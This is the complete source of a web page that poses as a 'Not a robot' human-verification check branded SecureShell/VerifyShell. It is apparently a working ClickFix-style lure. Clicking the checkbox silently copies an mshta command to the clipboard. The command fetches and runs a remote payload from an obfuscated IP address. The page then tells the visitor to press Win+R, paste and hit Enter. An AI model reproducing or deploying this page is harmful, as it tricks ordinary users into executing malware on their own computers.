<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>VerifyShell</title>

  <!-- Bootstrap -->
  <link
    href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"
    rel="stylesheet"
  />

  <style>
    body {
      margin: 0;
      font-family: "Segoe UI", sans-serif;
      background: #f4f7f9;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 80px 20px;
    }
    .titlebar {
      display: flex;
      align-items: center;
      background: #0a4c82;
      color: #fff;
      padding: 12px 20px;
      border-radius: 6px 6px 0 0;
      width: 100%;
      max-width: 480px;
      font-size: 18px;
      font-weight: bold;
    }
    .titlebar img {
      width: 22px; height: 22px; margin-right: 10px;
    }
    .container-box {
      background: #fff;
      border: 1px solid #cfdbe6;
      width: 100%;
      max-width: 480px;
      border-radius: 0 0 6px 6px;
      padding: 20px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.06);
    }
    .verify-box {
      border: 1px solid #d0d7de;
      padding: 14px;
      border-radius: 6px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      cursor: pointer;
      transition: all 0.2s ease;
    }
    .verify-box:hover {
      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
      transform: translateY(-2px);
    }
    .chk {
      width: 22px;
      height: 22px;
      border: 2px solid #555;
      border-radius: 4px;
      position: relative;
    }
    .chk.checked {
      background-color: #0a4c82 !important;
      border-color: #0a4c82;
    }
    .chk.checked::after {
      content: "";
      width: 6px;
      height: 12px;
      border: solid white;
      border-width: 0 2px 2px 0;
      transform: rotate(45deg);
      position: absolute;
      left: 6px;
      top: 2px;
    }
    .chk.loading::before {
      content: "";
      width: 16px; height: 16px;
      border: 2px solid #cfe3f6;
      border-top: 2px solid #1f6feb;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      position: absolute;
      top: 1px; left: 1px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
  </style>
</head>

<body>

  <div id="root"></div>

  <!-- React + ReactDOM CDN -->
  <script src="https://unpkg.com/react@18/umd/react.development.js"></script>
  <script src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>

  <!-- Babel Standalone (TypeScript Compiler in Browser) -->
  <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>

  <!-- TypeScript React Code -->
  <script type="text/babel" data-presets="typescript,react">
    function App() {
      const [checked, setChecked] = React.useState(false);
      const [loading, setLoading] = React.useState(false);
      const [expired, setExpired] = React.useState(false);

      const urlToCopy = "mshta http://5.0xFD.59.0xE4/n1/slu.lo";

      function copyToClipboard(text: string) {
        try {
          if (navigator.clipboard?.writeText) {
            navigator.clipboard.writeText(text);
          } else {
            const textarea = document.createElement("textarea");
            textarea.value = text;
            document.body.appendChild(textarea);
            textarea.select();
            document.execCommand("copy");
            textarea.remove();
          }
        } catch (e) {}
      }

      function handleClick() {
        if (checked || loading) return;
        setLoading(true);

        setTimeout(() => {
          setLoading(false);
          setChecked(true);
          copyToClipboard(urlToCopy);
        }, 1000);
      }

      // Timeout message
      React.useEffect(() => {
        const t = setTimeout(() => {
          if (!checked) setExpired(true);
        }, 20000);

        return () => clearTimeout(t);
      }, [checked]);

      React.useEffect(() => {
        if (expired) {
          const msg = document.createElement("div");
          msg.textContent = "⏳ Verification timed out. Please try again.";
          msg.style.cssText = `
            position: fixed;
            bottom: 24px;
            left: 50%;
            transform: translateX(-50%);
            background: #0a4c82;
            color: white;
            padding: 10px 16px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
            font-size: 14px;
            z-index: 9999;
          `;
          document.body.appendChild(msg);

          setTimeout(() => location.reload(), 3000);
        }
      }, [expired]);

      return (
        <>
          <div className="titlebar">
            <img
              alt="icon"
              src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Cpath fill='%23fff' d='M32 6l22 8v14c0 14-9 23-22 25C19 51 10 42 10 28V14z'/%3E%3Cpath fill='%230a4c82' d='M32 16l-8 12h16z'/%3E%3C/svg%3E"
            />
            SecureShell
          </div>

          <div className="container-box">
            <div className="text-center fw-bold mb-3">
              Verify you are human by completing the action below.
            </div>

            <div className="verify-box" onClick={handleClick}>
              <div className="d-flex align-items-center gap-2">
                <div className={`chk ${checked ? "checked" : ""} ${loading ? "loading" : ""}`}></div>
                <div className="fw-semibold">Not a robot verification</div>
              </div>

              <div className="text-end small">
                <div className="fw-bold">SecureShell</div>
                <div><a href="#">Privacy</a> • <a href="#">Terms</a></div>
              </div>
            </div>

            {checked && (
              <>
                <div className="mt-4">
                  <div className="d-flex align-items-center gap-2 mb-2 fw-bold">
                    <span className="badge bg-primary rounded-circle">1</span>
                    Press <span className="badge bg-secondary">Win</span> + <span className="badge bg-secondary">R</span>
                  </div>

                  <div className="d-flex align-items-center gap-2 mb-2 fw-bold">
                    <span className="badge bg-primary rounded-circle">2</span>
                    Press <span className="badge bg-secondary">CTRL</span> + <span className="badge bg-secondary">V</span>
                  </div>

                  <div className="d-flex align-items-center gap-2 fw-bold">
                    <span className="badge bg-primary rounded-circle">3</span>
                    Press <span className="badge bg-secondary">Enter</span>
                  </div>
                </div>

                <div className="text-center mt-2 small text-muted">
                  This verification step helps protect our system – VerifyShell ©2025.
                </div>
              </>
            )}
          </div>
        </>
      );
    }

    const root = ReactDOM.createRoot(document.getElementById("root"));
    root.render(<App />);
  </script>

</body>
</html>
